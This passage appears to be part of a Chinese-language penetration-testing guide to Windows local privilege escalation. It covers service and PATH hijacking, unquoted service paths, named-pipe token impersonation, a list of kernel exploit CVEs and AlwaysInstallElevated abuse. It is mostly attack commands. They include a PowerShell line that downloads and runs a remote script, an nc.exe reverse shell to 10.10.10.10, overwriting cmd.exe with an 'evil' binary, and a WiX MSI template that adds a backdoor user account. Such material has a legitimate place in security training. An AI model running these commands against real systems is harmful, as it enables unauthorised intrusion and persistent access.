    <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt

 $ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

 $ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
 <span class="nb">type</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div>    </div>
  </li>
</ol>

<p>在某些情况下，程序可能自主地加载某些路径的 dll，此时就需要逆向特定的应用才可以判断是否可以进行 DLL 劫持。</p>

<p>参考：</p>
<ul>
  <li><a href="https://www.cnblogs.com/bonelee/p/16227518.html">Powershell 提权框架-Powerup——平心而论，这个提权工具还是很好用的，看后面实战例子 - bonelee - 博客园</a></li>
</ul>

<h3 id="path-路径可写">PATH 路径可写</h3>
<p>下面的命令可以对服务的 path 路进具备的权限进行排查。</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt
$ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

$ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
<span class="nb">type</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div></div>
<p>两组命令都可以用，但会生成文件。</p>

<p>或者也可以直接使用 msf 中的 exp：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/windows/local/service_permissions
</code></pre></div></div>
<h3 id="windows-10---cve-2019-1322-usosvc">windows 10 - CVE-2019-1322 UsoSvc</h3>

<h3 id="windows-xp-sp1---upnphost">Windows XP SP1 - upnphost</h3>

<h2 id="利用-linux-子系统提权">利用 Linux 子系统提权</h2>
<blockquote>
  <p>凭借 root 权限，Windows Subsystem for Linux (WSL) 允许用户在任何端口上创建绑定 shell（无需提升）。  不知道 root 密码？  没问题，只需将默认用户设置为 root W/.exe –default-user root 即可。  现在启动您的绑定 shell 或反向操作。</p>
</blockquote>

<p>Windows 子系统的文件目录也是可以直接查看的：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\%</span>USERNAME%<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\C</span>anonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc<span class="se">\L</span>ocalState<span class="se">\r</span>ootfs<span class="se">\</span>
</code></pre></div></div>

<h2 id="利用未加引号的服务路径提权">利用未加引号的服务路径提权</h2>
<p>利用条件：</p>
<ul>
  <li>服务的路径存在无引号且包含空格或其他分隔符。</li>
  <li>上级路径可写。</li>
</ul>

<blockquote>
  <p>Microsoft Windows 无引号服务路径枚举漏洞。<br />
所有 Windows 服务都有其可执行文件的路径。<br />
如果该路径未加引号且包含空格或其他分隔符，则服务将首先尝试访问父路径中的资源。</p>
</blockquote>

<p>例如：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>For C:<span class="se">\P</span>rogram Files<span class="se">\s</span>omething<span class="se">\l</span>egit.exe, Windows will try the following paths first:

    C:<span class="se">\P</span>rogram.exe
    C:<span class="se">\P</span>rogram Files.exe
</code></pre></div></div>
<p>如果这类路径可写，即可劫持该服务的 exe，如果该服务具备高权限，则可提权。</p>

<p>搜索此类服务。</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">get</span> <span class="kd">name</span><span class="o">,</span><span class="kd">displayname</span><span class="o">,</span><span class="kd">pathname</span><span class="o">,</span><span class="kd">startmode</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i </span><span class="s2">"Auto"</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i /v </span><span class="s2">"C:\Windows\\"</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i /v </span><span class="s2">"""

wmic service get name,displayname,startmode,pathname | findstr /i /v "</span><span class="kd">C</span>:\Windows\\<span class="s2">" |findstr /i /v """</span>

<span class="kd">gwmi</span> <span class="na">-class </span><span class="kd">Win32_Service</span> <span class="na">-Property </span><span class="kd">Name</span><span class="o">,</span> <span class="kd">DisplayName</span><span class="o">,</span> <span class="kd">PathName</span><span class="o">,</span> <span class="kd">StartMode</span> <span class="o">|</span> <span class="kd">Where</span> <span class="o">{</span>$_.StartMode <span class="na">-eq </span><span class="s2">"Auto"</span> <span class="na">-and </span>$_.PathName <span class="na">-notlike </span><span class="s2">"C:\Windows*"</span> <span class="na">-and </span>$_.PathName <span class="na">-notlike </span><span class="s1">'"*'</span><span class="o">}</span> <span class="o">|</span> <span class="kd">select</span> <span class="kd">PathName</span><span class="o">,</span><span class="kd">DisplayName</span><span class="o">,</span><span class="kd">Name</span>
</code></pre></div></div>

<p>漏洞利用：</p>
<ul>
  <li>Metasploit exploit : exploit/windows/local/trusted_service_path</li>
  <li>PowerUp exploit
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="c"># find the vulnerable application</span><span class="w">
  </span><span class="n">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"</span><span class="w">

  </span><span class="o">...</span><span class="w">
  </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">unquoted</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">paths...</span><span class="w">
  </span><span class="n">ServiceName</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">BBSvc</span><span class="w">
  </span><span class="n">Path</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Microsoft\Bing</span><span class="w"> </span><span class="nx">Bar\7.1\BBSvc.exe</span><span class="w">
  </span><span class="n">StartName</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">
  </span><span class="n">AbuseFunction</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Write-ServiceBinary</span><span class="w"> </span><span class="nt">-ServiceName</span><span class="w"> </span><span class="s1">'BBSvc'</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">HijackPath</span><span class="err">&gt;</span><span class="w">
  </span><span class="o">...</span><span class="w">

  </span><span class="c"># automatic exploit</span><span class="w">
  </span><span class="n">Invoke-ServiceAbuse</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="p">[</span><span class="n">SERVICE_NAME</span><span class="p">]</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ul>

<h2 id="利用-path-拦截提权">利用 PATH 拦截提权</h2>
<p>利用条件：</p>
<ul>
  <li>PATH 路径中存在可写路径</li>
  <li>可写文件夹位于包含合法可执行文件的文件夹之前。</li>
</ul>

<p>示例：
ps 中执行如下的命令查看 PATH</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">Path</span><span class="w">
</span></code></pre></div></div>
<p>假设输出为:<code class="language-plaintext highlighter-rouge">C:\Program Files\nodejs\;C:\WINDOWS\system32</code></p>

<p>检查 C:\Program Files\nodejs 文件夹的权限发现可写。</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls.exe "C:\Program Files\nodejs\"
</code></pre></div></div>
<p>由于 nodejs 在 system32 之前，因此可以向 nodejs 文件夹中写入 cmd.exe，下次用户再执行 cmd 时，则会执行 nodejs 中的 cmd.exe</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">copy</span> <span class="kd">evil</span><span class="na">-file</span>.exe <span class="s2">"C:\Program Files\nodejs\cmd.exe"</span>
</code></pre></div></div>

<h2 id="利用-name-pipe-提权">利用 Name Pipe 提权</h2>
<h3 id="利用服务自身的漏洞或功能">利用服务自身的漏洞或功能</h3>
<p>找到存在命名管道的服务，挖掘服务漏洞或可用功能，利用 Name Pipe 操作这些功能或直接利用漏洞获取到高权限。</p>

<p>利用步骤：</p>
<ol>
  <li>Find named pipes: [System.IO.Directory]::GetFiles(“\.\pipe")</li>
  <li>Check named pipes DACL: pipesec.exe <named_pipe></named_pipe></li>
  <li>Reverse engineering software</li>
  <li>Send data throught the named pipe : program.exe &gt;\.\pipe\StdOutPipe 2&gt;\.\pipe\StdErrPipe</li>
</ol>

<h3 id="meterpreter-中的-getsystem">meterpreter 中的 getsystem</h3>
<p>有代表性的 EXP 如 meterpreter 中的 getsystem 命令。该技术的核心在于对 ImpersonateNamedPipeClient API 的利用，通过命名管道的服务端进程模仿客户端进程的访问令牌，获取 SYSTEM 权限。当然，想调用它，前提是进程具备 SeImpersonatePrivilege 的权限，而这通常意味着我们已经是 Admin 用户了。</p>

<p>利用细节：
1) getsystem 新建一个线程创建命名管道并等待服务发来的连接 (服务端)
2) getsystem 创建了一个以 SYSTEM 权限运行的 Windows 服务，该服务会向命名管道发起连接 (客户端)
3) 启动该服务，向目标命名管道发起连接 (客户端 -&gt; 服务端)
4) 该进程(服务端)接收连接，调用 ImpersonateNamedPipeClient，从而模仿了 SYSTEM 权限的访问令牌
5) 完成提权过程后，停止并删除该服务</p>

<p>参考</p>
<ul>
  <li><a href="https://www.anquanke.com/post/id/265507">走进Windows中的提权行为-安全客 - 安全资讯平台</a></li>
</ul>

<h3 id="printspoofer">PrintSpoofer</h3>
<p>命名管道提权的原理大多类似，一般是诱使 system 权限的服务访问我们指定的命名管道。</p>

<p>Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下启用。同时，Print Spooler 服务的 RPC 接口暴露在命名管道：\.\pipe\spoolss 中，该服务默认开启。</p>

<p>MS-RPRN 协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>

</code></pre></div></div>
<p>其中 pszLocalMachine 是指向表示客户端计算机名称的字符串的指针，需要传递一个 UNC 路径，传递 \127.0.0.1 时，服务器会访问 \127.0.0.1\pipe\spoolss，但这个管道已经被系统注册了，并由 NT AUTHORITY\SYSTEM 控制。</p>

<p>那么下一步就是要想办法把这个请求让我们准备好的恶意管道接收。</p>

<p>考虑到 UNC 路径的性质，如果主机名包含 /，它将通过路径检查，但真正连接的时候会转化为 \ 。那么，如果传递一个 \127.0.0.1/pipe/foo，检查时会认为 127.0.0.1/pipe/foo 是一个主机名，随后在连接 named pipe 时会对参数做标准化，于是就会连接 \127.0.0.1\pipe\foo\pipe\spoolss，那么攻击者就可以把主机名改为 \127.0.0.1/pipe/foo 并注册这个 named pipe 从而窃取 client 的 token。</p>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/itm4n/PrintSpoofer">itm4n/PrintSpoofer: Abusing impersonation privileges through the “Printer Bug”</a></li>
</ul>

<h2 id="利用内核漏洞提权">利用内核漏洞提权</h2>
<p>可参考：https://github.com/SecWiki/windows-kernel-exploits</p>

<ul>
  <li>CVE-2021-33739 [Microsoft DWM Core Library Elevation of Privilege Vulnerability] (Windows 10, 20)</li>
  <li>CVE-2021-1732 [Windows Win32k Elevation of Privilege Vulnerability] (Windows 10, 2019/20H2)</li>
  <li>CVE-2020-0787 [Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012- 2016/2019)</li>
  <li>CVE-2020-0796 [A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3)- protocol handles certain requests, aka ‘Windows SMBv3 Client/Server Remote Code Execution Vulnerability’] (Windows 1903/1909)</li>
  <li>CVE-2019-1458 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016)</li>
  <li>CVE-2019-0803 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016/2019)</li>
  <li>CVE-2018-8639 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016)</li>
  <li>CVE-2018-1038 [Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1)</li>
  <li>CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709- Windows Server version 1709)</li>
  <li>CVE-2018-8453 [An elevation of privilege vulnerability in Windows Win32k component] (&gt;= windows 8.1)</li>
  <li>CVE-2018-8440 [Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016)</li>
  <li>MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)</li>
  <li>CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</li>
  <li>CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</li>
  <li>CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service]  (Windows 8.1/Server 2012 R2)</li>
  <li>CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)</li>
  <li>MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)</li>
  <li>MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)</li>
  <li>MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)</li>
  <li>MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)</li>
  <li>MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)</li>
  <li>MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)</li>
  <li>MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)</li>
  <li>MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)</li>
  <li>MS16-014 　[K3134228]　　[remote code execution]　　(2008/Vista/7)</li>
  <li>MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)</li>
  <li>MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)</li>
  <li>MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)</li>
  <li>MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)</li>
  <li>MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)</li>
  <li>MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)</li>
  <li>MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)</li>
  <li>MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)</li>
  <li>MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)</li>
  <li>MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)</li>
  <li>MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)</li>
  <li>MS14-066 　[KB2992611]　　[Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2- SP1/2012/2012 R2/Windows RT/Windows RT 8.1)</li>
  <li>MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)</li>
  <li>MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)</li>
  <li>MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)</li>
  <li>MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)</li>
  <li>MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)</li>
  <li>MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)</li>
  <li>MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)</li>
  <li>MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)</li>
  <li>MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)</li>
  <li>MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)</li>
  <li>MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)</li>
  <li>MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)</li>
  <li>MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)</li>
  <li>MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)</li>
  <li>MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</li>
  <li>MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)</li>
  <li>MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2)</li>
  <li>MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)</li>
  <li>MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)</li>
  <li>MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)</li>
  <li>MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)</li>
  <li>MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)</li>
  <li>MS08-066 　[KB956803]　　 [AFD.sys]　　(Windows 2000/XP/Server 2003)</li>
  <li>MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)</li>
  <li>MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)</li>
  <li>MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)</li>
  <li>MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)</li>
</ul>

<h2 id="利用-microsoft-windows-installer-提权">利用 Microsoft Windows Installer 提权</h2>
<h3 id="alwaysinstallelevated-注册表项错误配置">AlwaysInstallElevated 注册表项错误配置</h3>

<p>windows 有一个系统进程 MSIEXEC，用于安装 Windows Installer 安装包，AlwaysInstallElevated 是一个组策略配置，如果启用，那么将允许普通用户以 SYSTEM 权限运行 msi 文件进行安装。如果对方机器恰好开启，我们就可以利用此缺陷提权。</p>

<p>注册表查询, 如果两个查询都返回值 0x1，则为用户和计算机启用了 AlwaysInstallElevated，表明系统容易受到攻击。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># shell</span>
reg query HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated

<span class="c"># ps</span>
Get-ItemProperty HKLM<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
Get-ItemProperty HKCU<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
</code></pre></div></div>

<p>漏洞利用：
MSF 的 exploit/windows/local/always_install_elevate 模块可以自动完成提权操作，会创建一个随机文件名的 msi 文件，并在提权成功后删除此mai文件，攻击成功会返回 system 权限会话</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getuid
use exploit/windows/local/always_install_elevated
<span class="nb">set </span>session 4
run
</code></pre></div></div>
<p>PowerUP 利用
检查注册表的设置：</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&amp; {import-module .\powerup.ps1; get-registryalwaysinstallelevated}"</span><span class="w">
</span></code></pre></div></div>

<p>生成新的账户：</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&amp; {import-module .\powerup.ps1; write-useraddmsi}"</span><span class="w">
</span></code></pre></div></div>

<p>Metasploit可以生成 MSI 类型的载荷，但很容易被 AV/EDR 所检测。所以我们可以手动创建 MSI 包裹文件。
我们可以使用工具 wix (https://github.com/wixtoolset/wix3) 来将包含二进制文件或者任意命令的模板 (https://github.com/KINGSABRI/MSI-AlwaysInstallElevated) 进行打包然后安装。
我们可以直接将要运行的载荷或者命令包含在里面，我们尝试执行添加新用户的命令，模板内容如下：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Wix</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/wix/2006/wi"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;Product</span> <span class="na">Id=</span><span class="s">"*"</span> <span class="na">UpgradeCode=</span><span class="s">"12345678-1234-1234-1234-111111111111"</span> <span class="na">Name=</span><span class="s">"23e23deeqwddeweqwde"</span> <span class="na">Version=</span><span class="s">"0.0.1"</span> <span class="na">Manufacturer=</span><span class="s">"Test1"</span> <span class="na">Language=</span><span class="s">"1033"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;Package</span> <span class="na">InstallerVersion=</span><span class="s">"200"</span> <span class="na">Compressed=</span><span class="s">"yes"</span> <span class="na">Comments=</span><span class="s">"Windows Installer Package"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Media</span> <span class="na">Id=</span><span class="s">'1'</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"TARGETDIR"</span> <span class="na">Name=</span><span class="s">"SourceDir"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"ProgramFilesFolder"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"INSTALLLOCATION"</span> <span class="na">Name=</span><span class="s">"Example"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;Component</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="na">Guid=</span><span class="s">"12345678-1234-1234-1234-222222222222"</span> <span class="na">KeyPath=</span><span class="s">"yes"</span><span class="nt">&gt;&lt;/Component&gt;</span>
                <span class="nt">&lt;/Directory&gt;</span>
            <span class="nt">&lt;/Directory&gt;</span>
        <span class="nt">&lt;/Directory&gt;</span>
        <span class="nt">&lt;Feature</span> <span class="na">Id=</span><span class="s">"DefaultFeature"</span> <span class="na">Level=</span><span class="s">"1"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;ComponentRef</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;/Feature&gt;</span>

        <span class="nt">&lt;CustomAction</span> 
            <span class="na">Id=</span><span class="s">"Shell"</span> 
            <span class="na">Execute=</span><span class="s">"deferred"</span>
            <span class="na">Directory=</span><span class="s">"TARGETDIR"</span> 
            <span class="na">Impersonate=</span><span class="s">"no"</span> 
            <span class="na">ExeCommand=</span><span class="s">"net user zhi 123.com /add"</span> 
            <span class="na">Return=</span><span class="s">"check"</span> 
        <span class="nt">/&gt;</span>

        <span class="nt">&lt;InstallExecuteSequence&gt;</span>
            <span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Shell"</span> <span class="na">After=</span><span class="s">"InstallFiles"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
        <span class="nt">&lt;/InstallExecuteSequence&gt;</span>
    <span class="nt">&lt;/Product&gt;</span>
<span class="nt">&lt;/Wix&gt;</span>
</code></pre></div></div>

<p>将该模板打包成 .msi 文件：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>candle zhi.wxs
light zhi.wixobj
</code></pre></div></div>

<p>此时已经生成了zhi.msi文件，运行该文件即可创建用户名为zhi</p>

<ul>
